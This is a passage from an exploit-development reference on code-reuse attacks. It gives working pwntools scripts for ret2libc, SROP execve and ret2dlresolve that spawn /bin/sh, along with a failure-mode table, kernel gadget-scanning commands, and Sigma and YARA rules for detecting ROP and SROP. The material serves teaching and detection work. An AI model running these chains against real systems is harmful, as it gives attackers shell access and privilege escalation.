POP_RDI = elf.search(asm("pop rdi; ret"), executable=True).__next__()
RET     = elf.search(asm("ret"), executable=True).__next__()

log.info(f"pop rdi; ret  = {hex(POP_RDI)}")
log.info(f"ret (align)   = {hex(RET)}")

# ── Stage 1: Leak libc via puts@PLT(puts@GOT) ─────────────────
io = conn()

payload  = b"A" * 72                    # padding: 64-byte buf + 8-byte saved rbp
payload += p64(POP_RDI)                 # rdi = puts@GOT (address to print)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])         # call puts() → prints resolved address
payload += p64(elf.symbols["main"])     # return to main for second stage

io.sendlineafter(b"> ", payload)

# Parse the leaked address.  puts outputs until NUL; on x86_64 the high
# two bytes of a libc address are typically 0x00 0x7f, so recvline strips
# trailing data.  ljust pads to 8 bytes for u64.
raw = io.recvline()
if len(raw.strip()) < 6:
    log.failure("Leak too short — check overflow offset or PLT resolution")
    io.close()
    sys.exit(1)

leaked_puts = u64(raw.strip().ljust(8, b"\x00"))
libc.address = leaked_puts - libc.symbols["puts"]

if libc.address & 0xfff != 0:
    log.failure(f"libc base not page-aligned: {hex(libc.address)} — bad leak")
    io.close()
    sys.exit(1)

log.success(f"leaked puts   = {hex(leaked_puts)}")
log.success(f"libc base     = {hex(libc.address)}")

# ── Stage 2: ret2libc — system("/bin/sh") ──────────────────────
bin_sh  = next(libc.search(b"/bin/sh\x00"))
system  = libc.symbols["system"]

# The RET gadget before POP_RDI is a "ret sled" — realigns rsp to 16 bytes.
# Without this, glibc's system() hits a movaps (SSE 128-bit aligned move)
# with unaligned rsp and faults.  The System V ABI requires 16-byte
# alignment at CALL; an odd push/pop count shifts alignment by 8.

payload2  = b"A" * 72
payload2 += p64(RET)                    # alignment fix (ret sled)
payload2 += p64(POP_RDI)               # pop rdi; ret
payload2 += p64(bin_sh)                # rdi = "/bin/sh"
payload2 += p64(system)                # call system("/bin/sh")

io.sendlineafter(b"> ", payload2)
log.success("shell incoming — switching to interactive")
io.interactive()
```

**Common failure modes and fixes:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| SIGSEGV at `movaps` inside libc | 16-byte stack misalignment | Insert `ret` gadget before the target call |
| Leaked address is `0x0a` or garbage | Newline byte in GOT address read by `gets`/`fgets` | Use `write@PLT` instead of `puts@PLT` for leak (avoids NUL/newline truncation) |
| Libc base not page-aligned | Wrong offset calculation or wrong libc version | Verify libc with `ldd ./vuln_binary`; use `libc-database` or `pwninit` to match |
| Stage 2 payload doesn't trigger | `main` doesn't re-read after returning | Chain to the vulnerable function directly instead of `main` |
| Works locally, fails remotely | Different libc version on remote | Use `LibcSearcher` or server-side `ldd` output to identify remote libc |

---

## 17C. SROP exploit — execve via sigreturn

§7.6 demonstrates SROP with a mprotect chain. This section covers the minimal execve variant: a single `SigreturnFrame` that sets all registers for `execve("/bin/sh", NULL, NULL)` and jumps to a `syscall` gadget.

### 17C.1 Minimal execve SROP

The minimum requirement: a `syscall; ret` (or bare `syscall`) gadget and a writable address containing `"/bin/sh\0"` (or enough stack control to embed it in the frame itself).

```python
#!/usr/bin/env python3
"""SROP exploit: execve('/bin/sh', 0, 0) via a single sigreturn frame."""
from pwn import *

context.arch = "amd64"
context.os   = "linux"

io = process("./vuln_srop")

# Addresses — adapt to target binary
SYSCALL_RET = 0x401032    # syscall; ret
POP_RAX_RET = 0x401020    # pop rax; ret
BIN_SH_ADDR = 0x402000    # address of "/bin/sh\0" in .rodata or writable segment

# If the binary doesn't contain "/bin/sh", embed "///bin/sh" in the
# sigreturn frame's padding area and point rdi there.  The triple slash
# is equivalent to a single slash in path resolution and avoids NUL issues
# in adjacent frame fields.

frame = SigreturnFrame()
frame.rax = constants.SYS_execve    # 59
frame.rdi = BIN_SH_ADDR            # filename = "/bin/sh"
frame.rsi = 0                       # argv = NULL
frame.rdx = 0                       # envp = NULL
frame.rip = SYSCALL_RET             # resume at syscall; ret
frame.rsp = 0xdeadbeef              # irrelevant — execve doesn't return

# Layout: padding | pop_rax;ret | 15 | syscall;ret | frame
payload  = b"A" * 72                            # overflow to saved RIP
payload += p64(POP_RAX_RET)                     # set rax = __NR_rt_sigreturn (15)
payload += p64(constants.SYS_rt_sigreturn)      # 15
payload += p64(SYSCALL_RET)                     # trigger rt_sigreturn
payload += bytes(frame)                         # the forged signal frame

io.sendlineafter(b"> ", payload)
io.interactive()
```

The `SigreturnFrame` occupies ~248 bytes (the size of `struct rt_sigframe`'s `uc_mcontext`). The attacker needs at least that much writable stack space past the overflow point. If the overflow window is smaller, a stack pivot (§2.4) to a heap buffer is required before the SROP payload.

### 17C.2 mprotect SROP chain for shellcode execution

For a complete mprotect-then-shellcode SROP chain, see §7.6. The pattern is:

1. Frame 1: `mprotect(target_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)` — sets `rsp` in the frame to point at Frame 2.
2. Frame 2: `read(0, target_page, shellcode_len)` — sets `rip` to `target_page` so after the read, execution falls into the just-written shellcode.

Each frame requires only `syscall; ret` and `pop rax; ret` — two gadgets total for arbitrary syscall chaining. This minimal gadget requirement is SROP's primary advantage over conventional ROP.

---

## 17D. ret2dlresolve exploit

### 17D.1 Overview

ret2dlresolve abuses the ELF lazy binding mechanism. When a PLT stub calls `_dl_fixup` with a relocation index, the runtime linker resolves the symbol by looking up the `Elf64_Rela` entry, the corresponding `Elf64_Sym`, and the symbol's name string. If the attacker can forge these structures at a known writable address and trigger `_dl_fixup` with a crafted relocation index pointing to the forgeries, the linker resolves an arbitrary symbol name (e.g., `"system"`) and calls it with attacker-controlled arguments.

ret2dlresolve is powerful against full RELRO targets where the GOT is read-only — the attack doesn't overwrite the GOT; it triggers a fresh resolution. It requires only a writable segment (`.bss` or a known `mmap` region) to place the forged structures.

### 17D.2 pwntools Ret2dlresolvePayload helper

pwntools provides `Ret2dlresolvePayload` to automate structure forging:

```python
#!/usr/bin/env python3
"""ret2dlresolve exploit using pwntools helper."""
from pwn import *

context.binary = elf = ELF("./vuln_binary")
io = process("./vuln_binary")

# Ret2dlresolvePayload forges Elf64_Sym + Elf64_Rela + symbol string
# at a writable address (default: end of .bss).
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop = ROP(elf)
rop.read(0, dlresolve.data_addr)         # read forged structures into .bss
rop.ret2dlresolve(dlresolve)             # trigger _dl_fixup with forged index

payload  = b"A" * 72                     # overflow padding
payload += rop.chain()

io.sendlineafter(b"> ", payload)

# Send the forged dl-resolve structures
io.send(dlresolve.payload)

io.interactive()
```

### 17D.3 Manual ret2dlresolve construction (x86_64)

For understanding (and for targets where pwntools helpers fail), the manual construction:

```python
#!/usr/bin/env python3
"""Manual ret2dlresolve: forge Elf64_Rela + Elf64_Sym + string."""
from pwn import *
import struct

context.binary = elf = ELF("./vuln_binary")

# Addresses from the ELF (readelf -S ./vuln_binary)
JMPREL  = elf.dynamic_value_by_tag("DT_JMPREL")   # .rela.plt base
SYMTAB  = elf.dynamic_value_by_tag("DT_SYMTAB")    # .dynsym base
STRTAB  = elf.dynamic_value_by_tag("DT_STRTAB")    # .dynstr base
PLT0    = elf.get_section_by_name(".plt").header.sh_addr  # PLT[0] — the resolver stub
BSS_END = elf.bss() + 0x200                          # writable staging area

# Compute the relocation index we will pass to PLT[0].
# _dl_fixup uses: reloc_index → JMPREL[reloc_index] → Elf64_Rela
#   Rela.r_info >> 32 → symbol index into SYMTAB
#   SYMTAB[sym_idx].st_name → offset into STRTAB → symbol name string

# Forge at BSS_END:
#   [0x000] Elf64_Rela    (24 bytes)
#   [0x018] Elf64_Sym     (24 bytes)
#   [0x030] "system\x00"  (7 bytes)
#   [0x038] "/bin/sh\x00" (8 bytes)

FORGE_BASE  = BSS_END
RELA_ADDR   = FORGE_BASE
SYM_ADDR    = FORGE_BASE + 24
STR_ADDR    = FORGE_BASE + 48
BINSH_ADDR  = FORGE_BASE + 56

# Symbol index: offset from SYMTAB base, divided by sizeof(Elf64_Sym)=24
sym_index = (SYM_ADDR - SYMTAB) // 24

# Relocation index: offset from JMPREL base, divided by sizeof(Elf64_Rela)=24
reloc_index = (RELA_ADDR - JMPREL) // 24

# Forge Elf64_Rela:  r_offset, r_info, r_addend
#   r_offset = writable address (GOT slot to fill — use BSS_END+0x100)
#   r_info   = (sym_index << 32) | R_X86_64_JUMP_SLOT(7)
#   r_addend = 0
r_offset = FORGE_BASE + 0x100
r_info   = (sym_index << 32) | 7
r_addend = 0
forged_rela = struct.pack("<QQq", r_offset, r_info, r_addend)

# Forge Elf64_Sym:  st_name, st_info, st_other, st_shndx, st_value, st_size
#   st_name = offset of "system" string from STRTAB base
st_name = STR_ADDR - STRTAB
forged_sym = struct.pack("<IBBHQQ", st_name, 0x12, 0, 0, 0, 0)

forged_str = b"system\x00"
forged_binsh = b"/bin/sh\x00"

# Combine all forged structures
forged_payload = forged_rela + forged_sym + forged_str + forged_binsh

# The ROP chain to deploy this: (1) call read(0, BSS_END, len(forged_payload))
# to write the forged structures into .bss, then (2) call PLT[0] with rdi
# pointing to BINSH_ADDR and the forged reloc_index on the stack.
# Step 1 requires pop rsi + pop rdx gadgets or ret2csu (§2.8) for multi-arg setup.
# Step 2: PLT[0] expects reloc_index as the first stack value after the call.
log.info(f"forged structures at: {hex(FORGE_BASE)}")
log.info(f"reloc_index: {reloc_index}, sym_index: {sym_index}")
```

The key insight: `_dl_fixup` trusts `Elf64_Rela.r_info` to index into `SYMTAB`, which indexes into `STRTAB` for the symbol name. Forged entries at controlled offsets make `_dl_fixup` resolve any symbol. On full RELRO, `_dl_fixup` is never called normally, but PLT[0] (the resolver stub) remains callable — the GOT write targets the forged `r_offset`, not the read-only GOT.

---

## 17E. JIT-ROP and data-only attacks

### 17E.1 JIT-ROP

JIT-ROP (Snow et al., 2013) defeats fine-grained ASLR implementations that randomize at the function or basic-block level. The attack requires a memory disclosure vulnerability (e.g., a buffer over-read or a format string that leaks heap/stack contents).

**Attack flow:**

1. **Disclose a code pointer.** Leak any single address within a loaded module (via info leak, partial overwrite, or side channel).
2. **Read code pages.** Using the disclosure primitive repeatedly, read executable memory starting from the leaked pointer. The attacker follows call/jump targets to map the code layout, effectively disassembling the binary at runtime.
3. **Find gadgets on-the-fly.** As code pages are disclosed, the attacker identifies gadgets in the leaked code — the same analysis ROPgadget performs offline, but done live against the randomized layout.
4. **Construct and deploy chain.** With gadget addresses known relative to the randomized base, the attacker builds a ROP chain and delivers it.

The entire process (disclosure → gadget scan → chain construction → payload delivery) happens within a single exploit attempt, defeating any ASLR scheme that doesn't also prevent code-page reads. Execute-only memory (`--execute-only` on AArch64, `PROT_EXEC` without `PROT_READ` where supported) is the architectural defense — if code pages cannot be read from user mode, JIT-ROP cannot disclose gadget bytes.

**Practical constraints:** JIT-ROP requires a fast, repeated read primitive. Browser exploits (JavaScript calling a disclosure function in a loop) are the primary venue. Server-side exploits rarely have a fast enough disclosure primitive — conventional info-leak + offline gadget analysis suffices when the code layout is known per-version.

### 17E.2 Data-oriented programming (DOP)

DOP (Hu et al., 2016) is a Turing-complete attack technique that **never hijacks control flow**. Instead, it corrupts non-control data (variables, array indices, structure fields) to chain together "data-oriented gadgets" — sequences of legitimate program instructions that operate on attacker-corrupted data.

**DOP gadget types:**

| Gadget type | Operation | Example (pseudocode) |
|-------------|-----------|----------------------|
| Assignment | `*p = *q` | Corrupting `p` or `q` to copy attacker-chosen values |
| Arithmetic | `*p = *q + *r` | Corrupting operand pointers to perform arbitrary addition |
| Dereference | `*p = **q` | Corrupting `q` to read from arbitrary addresses |
| Conditional | `if (*p) goto L` | Corrupting `*p` to steer execution through existing branches |

DOP chains compose these gadgets by corrupting loop variables (to repeat gadgets), array indices (to redirect reads/writes), and conditional variables (to select execution paths). Every branch and call is legitimate — only the data is attacker-controlled.

**DOP automation:** The BOPC framework (Ispoglou et al., 2018) automates DOP chain discovery by analyzing the data-flow graph. Block-oriented programming (§6) is closely related, using CFI-valid basic blocks as the composition unit.

**Real-world DOP examples:**

- **Nginx CVE-2013-2028**: DOP-style corruption of `ngx_connection_t` fields caused nginx's event loop to process requests with elevated privileges — no control-flow diversion.
- **Kernel DOP**: corrupting `task_struct.cred` pointers or `uid` fields to escalate privileges — the kernel's own `commit_creds` path runs normally on corrupted data.

**Defenses:** Data-flow integrity (DFI) instruments loads and stores to verify legitimate targets. Practical DFI remains expensive (10-50% overhead). Hardware memory tagging (ARM MTE, companion chapter 4B) provides probabilistic DFI — a corrupted pointer with a mismatched tag faults on dereference.

---

## 17F. Detection engineering

> **Scope boundary.** Rules here target code-reuse **technique** artifacts: ROP chain patterns in crash dumps, gadget scanning tool execution, SROP syscall patterns. For CFI/CET/PAC **bypass** detection (CET bypass artifacts, PAC oracle indicators, CFG bitmap corruption), see the companion chapter 4B.

### 17F.1 Sigma rules

```yaml
# Rule 1: ROP chain indicators in process crash dumps
title: ROP Chain Indicators in Crash Dump Stack
id: 8d3f2a10-c7e1-4b5a-9f6d-1a2b3c4d5e6f
status: experimental
description: >
    Detects crash dump analysis output indicating a ROP chain —
    many consecutive return addresses pointing to different code regions
    with extremely short frame sizes (1-5 instructions per frame).
logsource:
    product: linux
    service: coredump
detection:
    selection_crash:
        EventType: "core_dump"
    selection_pattern:
        - StackTrace|contains|all:
            - "ret"
            - "__libc_csu_init"
        - Signal: "SIGSEGV"
    filter_normal:
        StackDepth|lt: 5
    condition: selection_crash and selection_pattern and not filter_normal
level: high
tags:
    - attack.execution
    - attack.t1203
falsepositives:
    - Legitimate deep recursion crashes (unlikely to hit libc_csu_init)
    - Compiler-generated tail-call patterns
---
# Rule 2: Gadget scanning tool execution
title: ROP Gadget Discovery Tool Execution
id: 9e4f3b21-d8f2-5c6b-0a7e-2b3c4d5e6f70
status: stable
description: >
    Detects execution of known ROP gadget discovery tools — indicates
    active exploit development or binary analysis on the host.
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        - Image|endswith:
            - "/ROPgadget"
            - "/ropper"
            - "/rp++"
            - "/xrop"
            - "/one_gadget"
        - CommandLine|contains:
            - "ROPgadget"
            - "ropper -f"
            - "ropper --file"
            - "rp++ -f"
            - "one_gadget"
    condition: selection
level: medium
tags:
    - attack.resource_development
    - attack.t1587.004
falsepositives:
    - Security researchers and penetration testers with authorized scope
    - CTF practice on personal workstations
---
# Rule 3: SROP syscall pattern — rt_sigreturn followed by execve/mprotect
title: Suspicious rt_sigreturn Followed by Privilege-Escalating Syscall
id: af503c32-e9f3-6d7c-1b8f-3c4d5e6f7081
status: experimental
description: >
    Detects audit log pattern where rt_sigreturn (syscall 15) is
    immediately followed by execve (59) or mprotect (10) with
    PROT_EXEC, indicating potential SROP exploitation.
logsource:
    product: linux
    service: auditd
detection:
    selection_sigreturn:
        type: SYSCALL
        syscall: "15"
        success: "yes"
    selection_followup:
        type: SYSCALL
        syscall:
            - "59"
            - "10"
    timeframe: 1s
    condition: selection_sigreturn | near selection_followup
level: high
tags:
    - attack.execution
    - attack.t1059
falsepositives:
    - Signal-heavy applications (rare to see rt_sigreturn → execve in normal code)
```

### 17F.2 YARA rules

```yara
/* Rule 1: ROP chain payload — pop/ret gadget address sequences in data */
rule ROP_Chain_Payload_x86_64
{
    meta:
        description = "Packed sequences of .text addresses interleaved with pop/ret gadget bytes"
        severity    = "high"
        technique   = "T1203"

    strings:
        // Common x86_64 gadget encodings found in chain payloads:
        // pop rdi; ret = 5f c3
        // pop rsi; ret = 5e c3
        // pop rdx; ret = 5a c3
        // pop rax; ret = 58 c3
        // syscall; ret = 0f 05 c3
        // ret           = c3
        $pop_rdi_ret  = { 5f c3 }
        $pop_rsi_ret  = { 5e c3 }
        $pop_rdx_ret  = { 5a c3 }
        $pop_rax_ret  = { 58 c3 }
        $syscall_ret  = { 0f 05 c3 }

        // Three consecutive 8-byte values in the 0x40xxxx range
        // (typical .text addresses for no-PIE binaries)
        $addr_chain_3 = { ?? ?? 40 00 00 00 00 00 ?? ?? 40 00 00 00 00 00 ?? ?? 40 00 00 00 00 00 }

    condition:
        2 of ($pop_rdi_ret, $pop_rsi_ret, $pop_rdx_ret, $pop_rax_ret, $syscall_ret)
        and $addr_chain_3
}

/* Rule 2: SROP sigreturn frame — forged rt_sigframe structure */
rule SROP_Sigreturn_Frame
{
    meta:
        description = "Forged sigreturn frame with syscall numbers in rax position and /bin/sh nearby"
        severity    = "high"
        technique   = "T1059"

    strings:
        // rt_sigreturn syscall number (15 = 0x0f) in little-endian qword
        // at the position corresponding to rax in the sigframe
        $sigreturn_nr = { 0f 00 00 00 00 00 00 00 }

        // mprotect syscall number (10 = 0x0a) — common SROP target
        $mprotect_nr  = { 0a 00 00 00 00 00 00 00 }

        // execve syscall number (59 = 0x3b)
        $execve_nr    = { 3b 00 00 00 00 00 00 00 }

        // "/bin/sh" string nearby (within the frame or adjacent)
        $binsh        = "/bin/sh"

    condition:
        $sigreturn_nr and ($mprotect_nr or $execve_nr) and
        ($binsh in (@sigreturn_nr..@sigreturn_nr + 512))
}

/* Rule 3: Shellcode landing pad after mprotect RWX — code following
   a region made executable by mprotect(addr, len, 7) */
rule Shellcode_After_Mprotect_RWX
{
    meta:
        description = "NOP sled + syscall + shellcode bytes indicating post-mprotect code execution"
        severity    = "critical"
        technique   = "T1059.004"

    strings:
        // NOP sled variants
        $nop_sled_90   = { 90 90 90 90 90 90 90 90 }
        $nop_sled_xchg = { 87 db 87 db 87 db 87 db }

        // x86_64 syscall instruction
        $syscall       = { 0f 05 }

        // Common shellcode: push rax; ... syscall
        $sh_pattern1   = { 48 31 f6 48 31 d2 ?? ?? ?? 0f 05 }
        // execve setup: mov rax, 0x3b
        $sh_pattern2   = { 48 c7 c0 3b 00 00 00 }
        // /bin/sh pushed onto stack
        $sh_binsh      = { 2f 62 69 6e 2f 73 68 }

    condition:
        ($nop_sled_90 or $nop_sled_xchg) and $syscall and
        1 of ($sh_pattern1, $sh_pattern2, $sh_binsh)
}
```

### 17F.3 Runtime detection mechanisms

**ROPGuard** (Microsoft Research): hooks critical APIs (`VirtualProtect`, `LoadLibrary`, `WinExec`) and verifies the return address is preceded by a `call` instruction and stack frames are plausible. Integrated into EMET (deprecated) and partially into Windows Defender Exploit Guard.

**kBouncer**: uses hardware Last Branch Records (LBR) to verify the last N indirect branches before a sensitive syscall — a ROP chain produces `ret` branches to addresses not preceded by `call`. Adds ~1% overhead.

**CFI violation logging**: Clang's `-fsanitize=cfi` with `-fsanitize-recover=cfi` logs violations without termination. Logs record the check type, expected type hash, and actual target — sufficient for forensic analysis of exploitation attempts.

### 17F.4 Address space entropy analysis

```bash
# Measure libc ASLR entropy: sample 200 runs, count distinct base addresses
python3 -c "
import subprocess, collections
bases = collections.Counter()
for _ in range(200):
    out = subprocess.check_output(['ldd', './vuln_binary']).decode()
    for line in out.splitlines():
        if 'libc' in line:
            bases[line.split('(')[1].split(')')[0]] += 1
for addr, count in bases.most_common(5):
    print(f'{addr}: {count}/200')
"
```

On x86_64 Linux, user-space ASLR provides ~28 bits of entropy for shared libraries and ~30 bits for the stack. On 32-bit or under certain container runtimes, entropy can drop to 8-16 bits, making brute-force feasible (2^16 = 65536 attempts at ~100 attempts/sec = ~11 minutes).

---

## 17G. CVE reference table — code reuse as exploitation technique

The following CVEs used code reuse (ROP, SROP, JOP, ret2dlresolve, or DOP) as the primary post-corruption exploitation technique. This table tracks the **technique**, not the initial vulnerability class.

| CVE | Target | Vulnerability class | Code reuse technique | Impact |
|-----|--------|---------------------|----------------------|--------|
| CVE-2020-6418 | V8 JavaScript engine (Chrome) | Type confusion in TurboFan JIT | ROP chain in renderer process → sandbox escape chain | Remote code execution via crafted JavaScript |
| CVE-2016-0728 | Linux kernel (`keyctl`) | Use-after-free in keyring reference counting | ROP chain via corrupted function pointer in `key_type` struct | Local privilege escalation to root |
| CVE-2017-9765 | gSOAP (IoT SOAP library) | Stack buffer overflow in XML parser | ROP chain against embedded ARM/x86 devices without ASLR | Remote code execution on security cameras (Axis, Bosch) |
| CVE-2018-4990 | Adobe Acrobat Reader | Double-free in JPEG 2000 codec | ROP chain + heap spray to bypass ASLR + DEP | Remote code execution via malicious PDF |
| CVE-2021-1732 | Windows `win32kfull.sys` | Out-of-bounds write via `NtCallbackReturn` | Kernel ROP chain (ROP inside `win32kfull.sys` gadgets) | Local privilege escalation to SYSTEM |
| CVE-2019-0708 | Windows RDP (`termsrv.dll`) — BlueKeep | Use-after-free in MS-T120 channel | ROP chain in kernel pool (no user interaction required) | Wormable remote code execution |
| CVE-2021-22555 | Linux Netfilter (`nf_tables`) | Heap out-of-bounds write via `setsockopt` | Kernel ROP chain using `commit_creds`/`prepare_kernel_cred` gadgets | Local privilege escalation to root (container escape) |
| CVE-2016-5195 | Linux kernel — Dirty COW | Race condition in `get_user_pages` | Data-only attack (no control-flow hijack — DOP-adjacent) | Privilege escalation by overwriting read-only files |
| CVE-2020-0041 | Android Binder driver | Out-of-bounds write in `binder_transaction` | ROP chain to disable SELinux + escalate credentials | Android local root from unprivileged app |
| CVE-2022-0185 | Linux kernel (`fsconfig`) | Heap overflow in filesystem context | ROP chain via corrupted `msg_msg` structures | Container escape to host root |
| CVE-2017-5123 | Linux kernel (`waitid` syscall) | Arbitrary kernel write via unchecked `put_user` | Kernel SROP-analog (manipulated sigframe during signal delivery) | Local privilege escalation |
| CVE-2018-1000001 | glibc `getcwd` / `realpath` | Buffer underflow in `__realpath` | ret2dlresolve chain (no libc leak needed — forge resolution) | Local code execution as service user |

The table illustrates that ROP remains the dominant post-corruption technique across browser, kernel, IoT, and application targets. SROP and ret2dlresolve appear in scenarios where the gadget set is constrained (embedded systems, minimal binaries). DOP and data-only techniques (CVE-2016-5195) are emerging as CFI deployment increases.

---

## 18. Advanced code reuse research (post-2020)

This section covers code reuse techniques that have matured or emerged since 2020, extending the foundational treatments in §2–§8 and §17E. Where earlier sections introduced a technique, the focus here is on its evolution in the face of modern mitigations (CET, PAC, kCFI, W^X JIT).

### 18.1 Data-oriented programming — advanced chains

§17E.2 introduced DOP fundamentals (Hu et al., 2016). Post-2020 research has expanded DOP from proof-of-concept demonstrations to practical, semi-automated exploitation pipelines that remain invisible to all deployed CFI schemes.

**DOP dispatch loop exploitation.** Modern DOP relies on identifying a "dispatch loop" — a program loop whose iteration count and data pointers the attacker controls via a single corruption. The attacker chains data-oriented gadgets by corrupting:
1. The loop counter (controls how many gadgets execute)
2. An index variable (selects which gadget fires per iteration)
3. Pointer fields in the loop body's data structures (provides read/write/arithmetic)

**Practical DOP targets post-2020:**

- **HTTP/2 multiplexers** (e.g., Envoy proxy): corruption of stream-state arrays redirects request routing, header injection, or response mixing — no control-flow diversion required.
- **Database query executors**: corrupting the operator tree in a query plan node yields arbitrary memory read via `SELECT` and arbitrary write via `UPDATE`. PostgreSQL's executor loop (`ExecProcNode`) is a natural DOP dispatch.
- **Container runtimes**: corrupting `runc`'s config structures (namespace mappings, capability bitmasks) can yield container escape via data-only manipulation of `clone3` flags.

**CVE-2023-4911 (Looney Tunables — glibc `ld.so`):** a buffer overflow in the dynamic linker's `GLIBC_TUNABLES` environment variable processing. While early public exploits used ROP, researchers demonstrated a DOP-only variant: corrupting the `link_map` chain to redirect symbol resolution without hijacking any function pointer — the linker's own resolution loop (`_dl_fixup`) operates on attacker-controlled data. The attack works under full RELRO because it corrupts the linker's internal state before RELRO write-protection is applied.

**Newton (Xu et al., 2023) — automated DOP chain synthesis.** Newton extends BOPC (§17E.2) with:
- Data-flow reachability analysis across shared-library boundaries
- Taint-propagation-aware gadget selection (avoids gadgets whose side effects corrupt the dispatch loop)
- Support for multi-threaded targets (race-condition-safe DOP chains)

```
# Conceptual Newton workflow (academic tool, not publicly released as binary)
# 1. Build the inter-procedural data-flow graph
newton-analyze --binary /usr/sbin/nginx --libs /lib/x86_64-linux-gnu/libc.so.6 \
    --output dfg.json

# 2. Specify the DOP goal (e.g., overwrite uid field in connection struct)
newton-synthesize --dfg dfg.json \
    --goal "write:0x4a8:0" \
    --entry-corruption "heap_overflow@ngx_palloc" \
    --output chain.json

# 3. Generate exploit payload
newton-emit --chain chain.json --format python > exploit_dop.py
```

### 18.2 Speculative code reuse — Spectre meets ROP

Spectre v1 (bounds check bypass) and v2 (branch target injection) create transient execution windows where the CPU speculatively executes instructions from attacker-influenced targets. Speculative code reuse combines this with ROP/JOP:

**Attack model:**
1. The attacker identifies a speculative gadget: an indirect branch or return whose speculative target the attacker can train via branch target buffer (BTB) poisoning.
2. During transient execution, the CPU follows the attacker's trained target and executes a ROP-like chain — but only speculatively.
3. The speculative chain performs a memory read of a secret (e.g., kernel memory) and encodes the secret into a microarchitectural side channel (cache line access pattern).
4. The attacker observes the side channel after speculation is resolved.

**Key distinction:** speculative code reuse chains never commit architecturally. They leave no trace in registers or memory — only in cache state. This makes them invisible to all CFI, shadow stacks, and runtime integrity monitors.

**Speculative ROP (SpectreROP):** Koruyeh et al. (2020) demonstrated that ret2spec (speculative returns) can chain multiple speculative gadgets by poisoning the Return Stack Buffer (RSB). Each speculative `ret` pops an attacker-controlled address from the RSB, executing the next gadget transiently.

**Retbleed (CVE-2022-29900 / CVE-2022-29901):** a practical attack against AMD Zen 1/Zen 2 and Intel 6th–8th gen processors. Retbleed shows that `retpoline` — the Spectre v2 mitigation that converts indirect branches to `ret` instructions — is itself vulnerable because the RSB can be poisoned. The kernel `ret` speculatively jumps to an attacker-chosen gadget inside kernel code.

```bash
# Check kernel Retbleed mitigation status
cat /sys/devices/system/cpu/vulnerabilities/retbleed
# Expected output on mitigated system:
# Mitigation: untrained return thunk; SMT vulnerable

# Verify retpoline is compiled in
grep -c "retpoline" /proc/cpuinfo  # per-CPU flag
dmesg | grep -i "spectre\|retbleed\|retpoline"
```

**Inception (CVE-2023-20569 — AMD):** extends Retbleed by training the RSB via Phantom speculation (triggering speculation at non-branch instructions). This defeats IBRS (Indirect Branch Restricted Speculation) on AMD Zen 3/Zen 4.

**Mitigations for speculative code reuse:**
- IBRS / eIBRS: restricts indirect branch prediction to branches executed in the same privilege domain
- RSB filling/stuffing on context switch (call depth tracking)
- STIBP: prevents sibling-thread branch target injection
- Kernel page table isolation (KPTI): removes kernel mappings from user-space page tables, limiting speculative reach

### 18.3 JIT spray and JIT-ROP evolution in modern browsers

§17E.1 covered Snow et al.'s 2013 JIT-ROP. Browser JIT engines have evolved significantly:

**V8 TurboFan (Chrome) hardening timeline:**
- **2020:** W^X JIT regions — code pages are writable only during compilation, then flipped to execute-only (`mprotect` from `RW-` to `--X`). This defeats classic JIT-ROP disclosure of code pages.
- **2021:** V8 sandboxing (V8 Sandbox / pointer compression cage) — all V8 heap pointers are compressed to 4-byte offsets within a 4 GB cage. Corrupting a compressed pointer cannot reference arbitrary process memory.
- **2022:** Code pointer integrity — JIT code pointers in V8 are protected with an additional indirection through a code pointer table, preventing direct overwrite.

**SpiderMonkey (Firefox) Warp compiler:** adopted write-protect-then-execute model similar to V8. JIT code pages transition from `RW-` to `R-X` (not `--X` like V8, meaning code pages are still readable — JIT-ROP disclosure remains theoretically possible but requires a read primitive into the Warp compilation output region).

**Modern JIT spray techniques:**
- **Constant blinding bypass:** JIT compilers XOR immediate constants with a random key to prevent attacker-chosen byte sequences in JIT output. Attackers use multi-instruction sequences whose XOR-decoded form still yields useful gadgets.
- **Wasm JIT spray:** WebAssembly compilation is more predictable than JavaScript. An attacker supplies a Wasm module whose compiled output contains gadgets at known offsets relative to the Wasm code region base. Because Wasm semantics are simpler, compiler output is more deterministic.

**CVE-2021-21224 (V8 type confusion):** a type confusion in V8's TurboFan allowed arbitrary read/write within the V8 heap cage. Exploitation used the read primitive to locate JIT code, then overwrote JIT code pointers to redirect execution — a form of JIT-ROP within the sandboxed cage. The sandbox limited the attack to renderer process compromise (sandbox escape required a second vulnerability in the browser process).

### 18.4 Counterfeit object-oriented programming (COOP) evolution

§5 covered the original COOP technique (Schuster et al., 2015). Post-2020 evolution:

**Vtable spraying.** Instead of reusing existing vtables, the attacker sprays the heap with forged vtable structures. Each forged vtable entry points to a virtual function whose body is a useful gadget. COOP chains dispatch through the forged vtable sequence. This defeats vtable integrity checks that validate the vtable pointer against a list of known vtable addresses — the forged vtable is at a heap address, not in `.rodata`.

**Mitigation interaction:**
- **XFG (§12):** XFG type hashes on virtual call targets make vtable spraying significantly harder — each forged vtable entry must point to a function with the correct XFG hash, drastically limiting the gadget set.
- **Clang CFI (§13):** `-fsanitize=cfi-vcall` validates the vtable pointer itself against a bitset of valid vtable addresses. Forged vtables at heap addresses fail this check.
- **PAC (§11):** on AArch64 with PAC-protected vtable pointers, forging vtable pointers requires the correct PAC, which is derived from the pointer value and a context discriminator.

**CVE-2023-21768 (Windows AFD.sys):** a Windows Ancillary Function Driver vulnerability where a corrupted IRP (I/O Request Packet) dispatch table effectively created a COOP-like chain through the kernel's I/O dispatch machinery. The attacker overwrote the `MajorFunction` table in a driver object, redirecting IRP handling through a sequence of kernel functions that collectively performed privilege escalation.

### 18.5 Code reuse in the kernel — kROP and kCFI bypass

Kernel code reuse operates under stricter constraints but with higher payoff:

**Constraint landscape:**
- KASLR provides ~9 bits of entropy on x86_64 Linux (512 possible slide values) — weaker than user-space ASLR
- Kernel .text is mapped execute-only on recent kernels (`CONFIG_X86_KERNEL_IBT` + `CONFIG_STRICT_KERNEL_RWX`)
- kCFI (Clang) enforces forward-edge type checks in kernel code since Linux 6.1+
- FineIBT (Linux 6.2+) combines CET IBT with Clang kCFI for hardware-assisted kernel CFI

**kROP chain construction:**

```bash
# Extract kernel gadgets (requires vmlinux or /proc/kallsyms access)
# On a development/test kernel with KASLR disabled for analysis:
ROPgadget --binary /boot/vmlinux-$(uname -r) --rawArch=x86 --rawMode=64 \
    --multibr --depth 10 > kernel_gadgets.txt

# Count usable gadgets
